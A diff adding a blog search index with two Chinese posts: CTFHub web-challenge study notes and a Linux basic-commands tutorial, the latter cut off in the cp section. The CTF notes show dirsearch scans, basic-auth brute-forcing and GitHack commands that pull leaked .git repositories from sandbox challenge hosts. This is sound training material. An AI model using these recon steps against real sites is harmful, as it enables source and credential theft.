@@ -1,0 +1,1113 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>ctfhub学习</title>
+    <url>/2023/10/13/ctfhub%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="一、http协议"><a href="#一、http协议" class="headerlink" title="一、http协议"></a>一、http协议</h2><h3 id="1、请求方式"><a href="#1、请求方式" class="headerlink" title="1、请求方式"></a>1、请求方式</h3><p>HTTP，即超文本传输协议，是一种实现客户端和服务器之间通信的响应协议，它是用作客户端和服务器之间的请求。客户端（浏览器）会向服务器提交HTTP请求；然后服务器向客户端返回响应；其中响应包含有关请求的状态信息，还可能包含请求的内容。</p>
+<span id="more"></span>
+
+<p>HTTP共有八种请求方法：GET, POST，HEAD，OPTIONS, PUT, DELETE, TRACE 和 CONNECT</p>
+<p>其中用的最多的是GET,POST,PUT,DELETE</p>
+<p>使用burpsuite抓包软件可以拦截客户端与服务器的通信，可改变客户端。也就是客户输出的请求，将自己的想要改的请求发送给服务器，从而获得想要的信息</p>
+<h3 id="2、302跳转"><a href="#2、302跳转" class="headerlink" title="2、302跳转"></a>2、302跳转</h3><p>302跳转，即时将本来用户想要到达的一个网址，跳转到另一个新的网址</p>
+<p>比如一个portal（门户）页面，换了新的域名，但是老的域名地址还有很多用户在使用，这样可以对老域名配置302跳转到新域名地址，保证服务的延续。<br>另外对于一些客户端预埋的Url（网址）链接，免不了老版本地址失效与更改，将老地址配置302跳转到新地址，这样就能够全面兼容所有客户端版本。</p>
+<p>对于302这种改变原本的网址访问而跳转到另一个网址的，可以使用burpsuite软件进行抓包拦截，拦截成功会显示其进行了302跳转的行为，并且通过发送到重发器可以得到跳转前的信息</p>
+<h3 id="3、cookie"><a href="#3、cookie" class="headerlink" title="3、cookie"></a>3、cookie</h3><p>cookie的中文翻译是曲奇，小甜饼的意思。cookie其实就是一些数据信息，类型为“<strong>小型文本文件</strong>”，存储于电脑上的文本文件中。</p>
+<p>我们想象一个场景，当我们打开一个网站时，如果这个网站我们曾经登录过，那么当我们再次打开网站时，发现就不需要再次登录了，而是直接进入了首页。例如bilibili，csdn等网站。这是怎么做到的呢？其实就是游览器保存了我们的cookie，里面记录了一些信息，当然，这些cookie是服务器创建后返回给游览器的。游览器只进行了保存。</p>
+<p>我们在发送HTTP请求时，发现浏览器将我们的cookie都进行了携带**(注意：浏览器只会携带在当前请求的url中包含了该cookie中path值的cookie)**，并且是以key：value的形式进行表示的。多个cookie用；进行隔开。 </p>
+<p>cookie过程说明：1. 当用户通过浏览器第一次访问服务器的时候，服务器肯定是不知道他的身份的。<br>    所以，就要<strong>创建一个独特的身份标识数据，格式是“key&#x3D;value”，然后放进 Set-Cookie 字段里</strong>，<br>    随着响应报文一同发给浏览器。</p>
+<ol start="2">
+<li><p>浏览器收到响应报文，看到里面有 Set-Cookie，知道这是服务器给的身份标识，于是就保存起来，<br>下次再请求的时候就<strong>自动把这个值放进 Cookie 字段里发给服务器</strong>。</p>
+</li>
+<li><p><strong>因为第二次请求里面有了 Cookie 字段，服务器就知道这个用户不是新人</strong>，之前来过，<br>就可以拿出Cookie里的值，去<strong>检查究竟是从哪一个客户端发来的连接请求</strong>，然后对比服务器上的记录，最后得到之前的状态信息。识别出用户的身份，然后提供个性化的服务。</p>
+</li>
+</ol>
+<h3 id="4、基础认证"><a href="#4、基础认证" class="headerlink" title="4、基础认证"></a>4、基础认证</h3><p>用<strong>BASE64</strong>算法加密后的字符串放在<strong>HTTP Request</strong>中的<strong>Header Authorization</strong>中发送给服务端， 这种方式叫HTTP基本认证(Basic Authentication)</p>
+<p><strong>Basic</strong>认证是一种较为简单的HTTP认证方式，客户端通过明文（<a href="https://so.csdn.net/so/search?q=Base64&spm=1001.2101.3001.7020">Base64</a>编码格式）传输用户名和密码到服务端进行认证，通常需要配合HTTPS来保证信息传输的安全。</p>
+<p>如图</p>
+<p><img src="https://img-blog.csdnimg.cn/64cd2feb00444281850eaba87145a9f9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAcXFfMzU5MzA3Mzk=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
+<p>在解关于基础认证方面的题时，可以使用burpsuite对其进行抓包，因为基础认证是将BASE64加密过的用户名与密码放在HTTP Request中的Header Authorization发送给服务端</p>
+<p><img src="/2023/10/13/ctfhub%E5%AD%A6%E4%B9%A0/image-20231002231106455.png" alt="image-20231002231106455"></p>
+<p>所以可以在抓包到的信息中存在Authorization后面像是被base64加密过的字符进行分析，并且使用密码表文件对其进行强行爆破，可能可以得到正确的用户名与密码</p>
+<h2 id="二、信息泄露"><a href="#二、信息泄露" class="headerlink" title="二、信息泄露"></a>二、信息泄露</h2><h3 id="1、目录遍历"><a href="#1、目录遍历" class="headerlink" title="1、目录遍历"></a>1、目录遍历</h3><p>先从一张图看看目录遍历漏洞长什么样子</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/SouthEast.jpeg" alt="SouthEast">!](..&#x2F;..&#x2F;..&#x2F;桌面&#x2F;SouthEast.jpeg)</p>
+<p>一般遇到目录遍历漏洞，我们常做的就是去寻找有价值的东西去读取、下载，比如数据库</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/20171213135233120.jpg" alt="20171213135233120">一般是没有index.php就可能出现像这样的一个目录遍历的漏洞，但是一般情况下index文件都会有的。</p>
+<p>那么怎么去找目录遍历漏洞，一般是输入到文件目录，看页面响应，</p>
+<p>比如站点上的一张图片的的连接为：<a href="http://192.168.24.190/Images/185_01.jpg">http://192.168.24.190/Images/185_01.jpg</a></p>
+<p>我们把图片删除，只保留目录：<a href="http://192.168.24.190/Images/">http://192.168.24.190/Images/</a></p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/20171213135952148.jpg" alt="20171213135952148">浏览器看看<br>!](..&#x2F;..&#x2F;..&#x2F;桌面&#x2F;20171213135952148.jpg)</p>
+<p>那这样子就是存在目录遍历漏洞。</p>
+<p>目录遍历（路径遍历）是由于web服务器或者web应用程序对用户输入的文件名称的安全性验证不足而导致的一种安全漏洞，使得攻击者通过利用一些特殊字符就可以绕过服务器的安全限制，比如改变网址目录的名称，访问任意的文件（可以使web根目录以外的文件），甚至执行系统命令。</p>
+<h3 id="2、phpinfo"><a href="#2、phpinfo" class="headerlink" title="2、phpinfo"></a>2、phpinfo</h3><p>phpinfo() 是 PHP 中的一个函数，用于显示 PHP 运行环境的配置信息。<strong>该函数可以显示 PHP 的版本信息、编译器信息、模块信息、配置信息等</strong>，可以帮助开发者了解 PHP 的运行环境和配置信息。</p>
+<p>使用 phpinfo() 函数非常简单，只需要在 PHP 代码中添加以下代码即可：</p>
+<?php
+
+phpinfo();
+
+?>
+
+<p>运行该代码后，会输出一个包含 PHP 运行环境配置信息的 HTML 页面，其中包括了 PHP 的版本、编译器信息、模块信息、配置信息等。可以通过这些信息来了解 PHP 运行环境的具体配置和支持的功能。</p>
+<p>需要注意的是，<strong>由于 phpinfo() 函数可以显示 PHP 运行环境的详细信息，因此在生产环境中使用该函数需要格外小心，确保不会泄露敏感信息。</strong>通常情况下，<strong>建议在开发环境中使用该函数来了解 PHP 的运行环境信息。</strong></p>
+<h3 id="3、备份文件下载"><a href="#3、备份文件下载" class="headerlink" title="3、备份文件下载"></a>3、备份文件下载</h3><h4 id="1-网站源码"><a href="#1-网站源码" class="headerlink" title="1.网站源码"></a>1.网站源码</h4><p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>
+<p>其中，常见的网站源码备份文件后缀有</p>
+<p><strong>tar</strong><br><strong>tar.gz</strong><br><strong>zip</strong><br><strong>rar</strong></p>
+<p>常见的网站源码备份文件名有</p>
+<p><strong>web</strong><br><strong>website</strong><br><strong>backup</strong><br><strong>back</strong><br><strong>www</strong><br><strong>wwwroot</strong><br><strong>temp</strong></p>
+<p>通常情况下，在网址后面加上&#x2F;<strong>备份文件名.备份文件后缀</strong>即可得到放在web目录下的备份文件，而遇到这种题目的时候，可以使用dirsearch工具对网页进行扫描，来暴力分析网页是否存在隐藏的有用的文件，一般在下载dirsearch的目录下进入cmd（快捷指令为win+r）</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231003120137538.png" alt="image-20231003120137538">并且输入python dirsearch.py -u <a href="http://xxxx/">http://xxxx</a>   就可以对目标网页进行扫描了</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231003120330394.png" alt="image-20231003120330394"></p>
+<p>扫描结束后，查看返回值，大部分都是503，返回200的表示可以访问，代表该后缀下存在隐藏文件。</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231003120226450.png" alt="image-20231003120226450"></p>
+<p>然后即可通过添加这个后缀获取解出该题所需的文件</p>
+<h4 id="2-bak文件"><a href="#2-bak文件" class="headerlink" title="2.bak文件"></a>2.bak文件</h4><p>后缀名是.bak的文件是备份文件，是文件格式的扩展名</p>
+<p>此类文件通常以.bak开头，该文件应具有原始扩展名，例如windows.dll.bak或windows_dll.bak，其中一些后缀有原始文件，名称和bak混合在一起。 例如，<a href="https://so.csdn.net/so/search?q=proteus&spm=1001.2101.3001.7020">proteus</a>的备份文件是.DBK。如本题所得的bak文件就是index.php.bak<img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231003132025977.png" alt="image-20231003132025977"></p>
+<p>所以在解题的过程中，获取bak文件常常是要在目录后加.bak的后缀来得到文件</p>
+<p>通常，可以通过直接重命名bak并将其替换为文件格式来还原.bak文件，并且该文件通常处于打开状态。</p>
+<p>举个简单的例子：有时，当autocad文件移动时，会生成一个.bak文件。 例如，现在有asdfjk.dwg文件的备份文件asdfjk.bak。 要将备份文件还原为正式文件，只需重命名备份文件即可将bak替换为dwg来打开。</p>
+<p>简单的说，bak文件就是SQL Sever数据库的数据库备份文件的后缀名，不能直接打开，但是可以复制和发送，也就是在发送数据库库的时候其实是发送的bak文件，接收后先还原然后就可以看到其中的内容了。</p>
+<h4 id="3-vim缓存"><a href="#3-vim缓存" class="headerlink" title="3.vim缓存"></a>3.vim缓存</h4><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，<strong>当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</strong></p>
+<p>以 index.php 为例：第一次产生的交换文件名为 .index.php.swp</p>
+<p>再次意外退出后，将会产生名为 .index.php.swo 的交换文件</p>
+<p>第三次产生的交换文件则为 .index.php.swn</p>
+<p>vim中的swp即swap（交换分区）的简写，在编辑文件时产生，它是隐藏文件。这个文件是一个临时交换文件，用来备份缓冲区中的内容。类似于Windows的虚拟内存，就是当内存不足的时候,把一部分硬盘空间虚拟成内存使用,从而解决内存容量不足的情况。</p>
+<p><strong>如果文件正常退出，则此文件自动删除。</strong></p>
+<p>如果并没有对文件进行修改，而只是读取文件，是不会产生swp文件的。</p>
+<p>vim -r 可以查看当前目录下所有的swp文件。<br>vim -r filename可以恢复文件，这样上次意外退出没有保存的修改，就会覆盖文件</p>
+<p><strong>注意：.swp是隐藏文件，因此最前面有. ，即.index.php.swp，注意index前面的点。</strong></p>
+<h4 id="4-DS-Store文件"><a href="#4-DS-Store文件" class="headerlink" title="4.  .DS_Store文件"></a>4.  .DS_Store文件</h4><p>.DS_Store文件在Mac OS上存在。</p>
+<p>DS_Store 是用来存储这个文件夹的显示属性的：比如文件图标的摆放位置。删除以后的副作用就是这些信息的失去。（当然，这点副作用其实不是太大）</p>
+<p>和别人交换文件（或你做的网页需要上传的时候）应该把 .DS_Store 文件删除比较妥当，因为里面包含了一些你不一定希望别人看见的信息（尤其是网站，通过 .DS_Store 可以知道这个目录里面所有文件的清单，很多时候这是一个不希望出现的问题）　　</p>
+<p>在写有关DS_Store文件的题目时，可以试着在网址后面添加.DS_Store这个后缀，可能可以得到隐藏的文件</p>
+<h3 id="4、git泄露"><a href="#4、git泄露" class="headerlink" title="4、git泄露"></a>4、git泄露</h3><h4 id="1-log"><a href="#1-log" class="headerlink" title="1.log"></a>1.log</h4><p>Git是一个可以实现有效控制应用版本的系统，但是在一旦在代码发布的时候，存在不规范的操作及配置，就很可能将源代码泄露出去。那么，一旦攻击者或者黑客发现这个问题之后，就可能利用其获取网站的源码、数据库等重要资源信息，进而造成严重的危害。</p>
+<p>在配置不当的情况下，<strong>可能会将“.git”文件直接部署到线上环境</strong>，这就造成了git泄露问题。</p>
+<p>攻击者<strong>利用该漏洞下载.git文件夹中的所有内容</strong>。如果文件夹中存在敏感信息(数据库账号密码、源码等)，通过白盒的审计等方式就可能直接获得控制服务器的权限和机会！</p>
+<p>解ctfhub中的此题时，首先可以用dirsearch扫描一下网站，在此附上dirsearch扫描的指令：<strong>python dirsearch.py -u <a href="http://xxxx/">http://xxxx</a></strong></p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231005231842554.png" alt="image-20231005231842554"></p>
+<p>扫描得到发现存在git漏洞，于是就要用到一个新的工具——<strong>GitHack</strong></p>
+<p>下载GitHack附上一个别人的安装教程<a href="https://blog.csdn.net/qq_45728555/article/details/125019304?ops_request_misc=%7B%22request_id%22:%22167722055016800213076838%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167722055016800213076838&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-125019304-null-null.142%5Ev73%5Econtrol,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=GitHack&spm=1018.2226.3001.4187">GitHack在kali Linux环境下的下载与安装_kali安装githack_想当白帽子的小白的博客-CSDN博客</a></p>
+<p>下载完githack后可以使用口令扫描网址</p>
+<p>python2 GitHack.py <a href="http://challenge-b8c5f98cede73d6e.sandbox.ctfhub.com:10800/.git**%EF%BC%88%E8%AE%B0%E4%BD%8F%E8%A6%81%E5%9C%A8%E7%BD%91%E5%9D%80%E5%90%8E%E5%8A%A0%E4%B8%8A.git%EF%BC%89">http://challenge-b8c5f98cede73d6e.sandbox.ctfhub.com:10800/.git**（记住要在网址后加上.git）</a>**</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231005232606857.png" alt="image-20231005232606857"></p>
+<p>扫描成功后发现在GitHack文件夹出现了一个dist文件夹，进入图片中出现的目录，输入git log查看历史日志信息</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231005233013161.png" alt="image-20231005233013161"></p>
+<p>发现在第二次修改时有add flag操作，说明我们要找的flag就在第二次修改中加入其中，使用git reset这个版本回退命令来查看flag</p>
+<p>操作示例：</p>
+<p><strong>git reset –hard +对应版本的commit</strong><br><strong>例：git reset –hard 0037c2045e98f9067b2101944060c954cb880bb5</strong></p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231005233416132.png" alt="image-20231005233416132"></p>
+<p>发现有个txt文件出现在文件夹中，打开便得到flag</p>
+<p>在此附上一个git的菜鸟教程<a href="https://www.runoob.com/git/git-reset.html">git reset 命令 | 菜鸟教程 (runoob.com)</a></p>
+<h4 id="2-stash"><a href="#2-stash" class="headerlink" title="2.stash"></a>2.stash</h4><p>stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。</p>
+<p>输入命令    <strong>python2 GitHack.py <a href="http://challenge-c1e9c8c119a100a0.sandbox.ctfhub.com:10800/.git">http://challenge-c1e9c8c119a100a0.sandbox.ctfhub.com:10800/.git</a></strong> </p>
+<p>利用<strong>git stash list</strong>列出Git栈内的所有备份，可以利用这个列表来决定从那个地方恢复。</p>
+<p><strong>git stash list</strong></p>
+<p>利用<strong>git stash pop</strong>从Git栈中读取最近一次保存的内容</p>
+<p><strong>git stash pop</strong></p>
+<p>然后得到flag文件出现在文件夹中</p>
+<h4 id="3-index"><a href="#3-index" class="headerlink" title="3.index"></a>3.index</h4><p>和上题差不多，先用githack克隆，git log ，再回退版本，然后ls</p>
+<p>在cat查看，就得到了flag</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/image-20231006001932693.png" alt="image-20231006001932693"></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctfhub</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>linux基础操作</title>
+    <url>/2023/10/22/linux%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/</url>
+    <content><![CDATA[<h1 id="linux基础命令"><a href="#linux基础命令" class="headerlink" title="linux基础命令"></a>linux基础命令</h1><h2 id="1-ls"><a href="#1-ls" class="headerlink" title="1.ls"></a>1.ls</h2><p><strong>ls</strong>英文为list，作用是查看当前文件夹下的内容，可以列出目录及文件名</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/%25E5%259B%25BE%25E7%2589%25871.png" alt="图片1"></p>
+<p>同时，可以在命令的后面接参数，完成更多的操作</p>
+<p>对于ls来说，常见的有-a,-l,-d等参数。如果想知道完整用法，可以使用man ls查看</p>
+<p><strong>1.ls -a</strong></p>
+<p>​	显示目录下所有的文件，包括隐藏(以.开头)</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/%25E5%259B%25BE%25E7%2589%25872.png" alt="图片2"></p>
+<p><strong>2.ls –l</strong></p>
+<p>长数据串列出，包含文件的属性与权限等等数据，会产生长列表格式输出，包含了目录中每个文件的更多的信息</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/%25E5%259B%25BE%25E7%2589%25873.png" alt="图片3"></p>
+<p>其中在上图，看到了一个–&gt;的标志，这个是什么呢，要知道就要看接下来这个知识点</p>
+<h2 id="2-ln-link-files-创建同步链接"><a href="#2-ln-link-files-创建同步链接" class="headerlink" title="2.ln(link files):创建同步链接"></a>2.ln(link files):创建同步链接</h2><p><code>ln</code> <strong>命令可以为某个文件或目录在另外一个位置建立软链接，也称为符号链接</strong>。类似于 Windows 系统里的快捷方式。<code>ln</code> 是 <code>link</code> 的缩写。</p>
+<p>其中ln的使用语法经常为如下格式</p>
+<p>#语法</p>
+<p><strong>ln -s 源文件或目录 目标软链接文件</strong></p>
+<p><em># 示例</em></p>
+<p> ln -s &#x2F;home&#x2F;lighthouse&#x2F;test.txt test.link</p>
+<p> ln -s &#x2F;home&#x2F;lighthouse&#x2F;test test</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/99d846c619494ad89dad72b4ee47073d.png" alt="99d846c619494ad89dad72b4ee47073d"></p>
+<h2 id="3-touch"><a href="#3-touch" class="headerlink" title="3.touch"></a>3.touch</h2><p>用于修改文件或者目录的时间属性，包括存取时间和更改时间。若文件不存在，系统会建立一个新的文件。主要使用<strong>创造文件</strong>。</p>
+<p>如果文件 不存在，可以创建一个空白文件<br>如果文件 已经存在，可以修改文件的末次修改日期</p>
+<p><img src="https://liuew.oss-cn-hangzhou.aliyuncs.com/img/%25E5%259B%25BE%25E7%2589%25874.png" alt="图片4"></p>
+<h2 id="4-cd"><a href="#4-cd" class="headerlink" title="4.cd"></a>4.cd</h2><p><code>cd</code> 是英文单词 change directory 的简写，其功能为更改当前的工作目录，也是用户<strong>最常用的命令之一</strong><br>注意：Linux 所有的 目录 和 文件名 都是大小写敏感的</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>cd</td>
+<td>切换到当前用户的主目录(&#x2F;home&#x2F;用户目录)</td>
+</tr>
+<tr>
+<td>cd ~</td>
+<td>切换到当前用户的主目录(&#x2F;home&#x2F;用户目录)</td>
+</tr>
+<tr>
+<td>cd .</td>
+<td>保持在当前目录不变</td>
+</tr>
+<tr>
+<td>cd …</td>
+<td>切换到上级目录</td>
+</tr>
+<tr>
+<td>cd -</td>
+<td>可以在最近两次工作目录之间来回切换</td>
+</tr>
+</tbody></table>
+<h4 id="相对路径和绝对路径"><a href="#相对路径和绝对路径" class="headerlink" title="相对路径和绝对路径"></a>相对路径和绝对路径</h4><p>相对路径 在输入路径时，最前面不是 &#x2F; 或者 ~，表示相对 当前目录 所在的目录位置<br>绝对路径 在输入路径时，最前面是 &#x2F; 或者 ~，表示从 <strong>根目录&#x2F;家目录</strong> 开始的具体目录位置</p>
+<h2 id="5-pwd"><a href="#5-pwd" class="headerlink" title="5.pwd"></a>5.pwd</h2><p>pwd命令的基本使用非常简单，只需要在命令行中输入<code>pwd</code>即可，这样就会返回当前工作目录的完整路径。</p>
+<p>例如，在用户的家目录（home directory）中执行pwd命令，结果可能会像下面这样：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="variable">$</span> <span class="built_in">pwd</span></span><br><span class="line"><span class="number">2</span> /home/username</span><br></pre></td></tr></table></figure>
+
+<p>这表示当前工作目录是<code>/home/username</code>，也就是用户username的家目录。在Linux系统中，每个用户都有一个独立的家目录，通常位于<code>/home/</code>目录下，用户名即为其家目录的名称。</p>
+<p>pwd命令中的两个参数，<code>-P</code>和<code>-L</code>，是用于处理符号链接的。</p>
+<p>例如，创建一个名为link_to_dir的符号链接，指向目录dir，然后切换到该符号链接：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> ln <span class="literal">-s</span> <span class="built_in">dir</span> link_to_dir</span><br><span class="line"><span class="variable">$</span> <span class="built_in">cd</span> link_to_dir</span><br></pre></td></tr></table></figure>
+
+<p>此时执行pwd命令，结果可能会像下面这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ pwd</span><br><span class="line">/home/username/link_to_dir</span><br></pre></td></tr></table></figure>
+
+<p>使用-P参数执行pwd命令，结果可能会像下面这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ pwd -P</span><br><span class="line">/home/username/dir</span><br></pre></td></tr></table></figure>
+
+<p>这两个结果明显不同，前者显示了符号链接的路径，后者显示了实际的物理路径。<br>当需要生成一个文件或目录的绝对路径时，可以使用pwd命令。例如，可以把pwd命令的输出和一个相对路径连接起来，生成一个绝对路径。</p>
+<h2 id="6-makir"><a href="#6-makir" class="headerlink" title="6.makir"></a>6.makir</h2><p>mkdir是make directory的缩写，Linux中 mkdir 命令用来创建指定的名称的目录，要求创建目录的用户在当前目录中具有写权限，并且指定的目录名不能是当前目录中已有的目录。</p>
+<h6 id="1-语法："><a href="#1-语法：" class="headerlink" title="1.语法："></a>1.语法：</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir [选项] 目录名称</span><br></pre></td></tr></table></figure>
+
+<h6 id="2-常用范例："><a href="#2-常用范例：" class="headerlink" title="2.常用范例："></a>2.常用范例：</h6><p><strong>例一：创建一个空目录</strong></p>
+<p>命令：<code>mkdir test</code></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># cd /usr/games/</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> <span class="type">games</span>]<span class="comment"># ll</span></span><br><span class="line">总用量 <span class="number">0</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> <span class="type">games</span>]<span class="comment"># mkdir test</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> <span class="type">games</span>]<span class="comment"># ll</span></span><br><span class="line">总用量 <span class="number">0</span></span><br><span class="line">drwxr<span class="literal">-xr-x</span>. <span class="number">2</span> root root <span class="number">6</span> <span class="number">5</span>月  <span class="number">13</span> <span class="number">10</span>:<span class="number">41</span> test</span><br></pre></td></tr></table></figure>
+
+<p><strong>例二：递归创建多个目录</strong></p>
+<p>命令：<code>mkdir -p test2/test22</code></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> <span class="type">games</span>]<span class="comment"># ll</span></span><br><span class="line">总用量 <span class="number">0</span></span><br><span class="line">drwxr<span class="literal">-xr-x</span>. <span class="number">2</span> root root <span class="number">6</span> <span class="number">5</span>月  <span class="number">13</span> <span class="number">10</span>:<span class="number">41</span> test</span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> <span class="type">games</span>]<span class="comment"># mkdir -p test2/test22</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> <span class="type">games</span>]<span class="comment"># ll</span></span><br><span class="line">总用量 <span class="number">0</span></span><br><span class="line">drwxr<span class="literal">-xr-x</span>. <span class="number">2</span> root root  <span class="number">6</span> <span class="number">5</span>月  <span class="number">13</span> <span class="number">10</span>:<span class="number">41</span> test</span><br><span class="line">drwxr<span class="literal">-xr-x</span>. <span class="number">3</span> root root <span class="number">20</span> <span class="number">5</span>月  <span class="number">13</span> <span class="number">10</span>:<span class="number">44</span> test2</span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> <span class="type">games</span>]<span class="comment"># cd test2/</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> <span class="type">test2</span>]<span class="comment"># ll</span></span><br><span class="line">总用量 <span class="number">0</span></span><br><span class="line">drwxr<span class="literal">-xr-x</span>. <span class="number">2</span> root root <span class="number">6</span> <span class="number">5</span>月  <span class="number">13</span> <span class="number">10</span>:<span class="number">44</span> test22</span><br></pre></td></tr></table></figure>
+
+<p>递归创建多个目录，即依次创建“mkdir -p”后面的目录，若以存在前面的目录，则直接进行创建下一个目录，且后面的目录为前面目录的子目录</p>
+<p><strong>例三：创建新目录都显示信息</strong></p>
+<p>命令： <code>mkdir -v test4</code></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> <span class="type">games</span>]<span class="comment"># mkdir -v test4</span></span><br><span class="line">mkdir: 已创建目录 <span class="string">&#x27;test4&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>例四：一个命令创建项目的目录结构</strong></p>
+<p>命令： <code>mkdir -vp scf/&#123;lib/,bin/,doc/&#123;info,product&#125;,logs/&#123;info,product&#125;,service/deploy/&#123;info,product&#125;&#125;</code></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> <span class="type">games</span>]<span class="comment"># mkdir -vp scf/&#123;lib/,bin/,doc/&#123;info,product&#125;,logs/&#123;info,product&#125;,service/deploy/&#123;info,product&#125;&#125;</span></span><br><span class="line">mkdir: 已创建目录 <span class="string">&#x27;scf&#x27;</span></span><br><span class="line">mkdir: 已创建目录 <span class="string">&#x27;scf/lib/&#x27;</span></span><br><span class="line">mkdir: 已创建目录 <span class="string">&#x27;scf/bin/&#x27;</span></span><br><span class="line">mkdir: 已创建目录 <span class="string">&#x27;scf/doc&#x27;</span></span><br><span class="line">mkdir: 已创建目录 <span class="string">&#x27;scf/doc/info&#x27;</span></span><br><span class="line">mkdir: 已创建目录 <span class="string">&#x27;scf/doc/product&#x27;</span></span><br><span class="line">mkdir: 已创建目录 <span class="string">&#x27;scf/logs&#x27;</span></span><br><span class="line">mkdir: 已创建目录 <span class="string">&#x27;scf/logs/info&#x27;</span></span><br><span class="line">mkdir: 已创建目录 <span class="string">&#x27;scf/logs/product&#x27;</span></span><br><span class="line">mkdir: 已创建目录 <span class="string">&#x27;scf/service&#x27;</span></span><br><span class="line">mkdir: 已创建目录 <span class="string">&#x27;scf/service/deploy&#x27;</span></span><br><span class="line">mkdir: 已创建目录 <span class="string">&#x27;scf/service/deploy/info&#x27;</span></span><br><span class="line">mkdir: 已创建目录 <span class="string">&#x27;scf/service/deploy/product&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="7-cp-copy-file"><a href="#7-cp-copy-file" class="headerlink" title="7.cp(copy file)"></a>7.cp(copy file)</h2><p><strong>cp 命令</strong>，主要用来复制文件和目录，同时借助某些选项，还可以实现复制整个目录，以及比对两文件的新旧而予以升级等功能。</p>
+<h4 id="一、基本格式"><a href="#一、基本格式" class="headerlink" title="一、基本格式"></a>一、基本格式</h4><p>cp 命令的基本格式如下：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">localhost</span> ~]<span class="comment"># cp [选项] 源文件 目标文件</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="二、参数"><a href="#二、参数" class="headerlink" title="二、参数"></a>二、参数</h4><p>选项：</p>
+<p>-a：相当于 -d、-p、-r 选项的集合，这几个选项我们一一介绍；<br>-d：如果源文件为<strong>软链接</strong>（对硬链接无效），则复制出的目标文件也为软链接；<br>-i：询问，如果目标文件已经存在，则会询问是否覆盖；<br>-l：把目标文件建立为源文件的硬链接文件，而不是复制源文件；<br>-s：把目标文件建立为源文件的软链接文件，而不是复制源文件；<br>-p：复制后目标文件保留源文件的属性（包括所有者、所属组、权限和时间）；<br>-r：递归复制，用于复制目录；<br>-u：若目标文件比源文件有差异，则使用该选项可以更新目标文件，此选项可用于对文件的升级和备用。</p>
+<h4 id="三、示例"><a href="#三、示例" class="headerlink" title="三、示例"></a>三、示例</h4><h5 id="【例-1】cp-命令基本用法"><a href="#【例-1】cp-命令基本用法" class="headerlink" title="【例 1】cp 命令基本用法"></a>【例 1】cp 命令基本用法</h5><p>cp 命令既可以复制文件，也可以复制目录。</p>
